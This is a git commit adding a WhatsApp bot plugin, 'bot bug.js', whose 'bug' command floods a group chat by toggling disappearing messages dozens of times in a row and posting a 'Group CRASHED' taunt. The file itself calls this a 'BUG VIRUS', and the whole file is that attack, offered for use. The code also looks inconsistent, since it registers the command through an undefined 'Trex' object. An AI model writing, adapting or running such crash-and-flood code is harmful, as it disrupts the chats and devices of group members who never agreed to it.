1bdd1647a41d624223b2e0dfe9a9567a6ac82152
Dark-Maxv1 <98449027+Dark-Maxv1@users.noreply.github.com>
2022-02-07 20:26:14 +0530

    Don't update

---
+++ plugins/bot bug.js
@@ -0,0 +1,100 @@
+const {MessageType, GroupSettingChange, Mimetype} = require('@adiwajshing/baileys');
+const Alpha = require('../events');
+const Config = require('../config');
+const Language = require('../language');
+const Lang = Language.getString('spammer');
+const END = '_😈 G⃟r̸o̸o̸p̸ C͎R̶A̶S̶H̶E̶D̶ B͜͡Y_ *Alpha* 😈'
+// Doesn't work on new whatsapp update
+
+var  BUG_CRASH_DESC = '' 
+if (Config.LANG == 'EN') BUG_CRASH_DESC = 'send BUG VIRUS to group.'
+if (Config.LANG == 'SI') BUG_CRASH_DESC = 'බග් වයිරසය යැවීමට.'
+
+var  HIGH_BUG_CRASH_DESC = '' 
+if (Config.LANG == 'EN') HIGH_BUG_CRASH_DESC = 'send BUG VIRUS to group untill you stop.'
+if (Config.LANG == 'SI') HIGH_BUG_CRASH_DESC = 'බග් වයිරසය ඔබ නවතන තුරු යැවීමට.'    
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Trex.addrex({pattern: 'bug ?(.*)', fromMe: true, desc: BUG_CRASH_DESC}, (async (message, match) => {
+
+    if (match[1] == '') {
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,END, MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,END, MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,END, MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,END, MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.toggleDisappearingMessages(message.jid, 604800);
+            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,END, MessageType.text);
+
+            }
+    }));
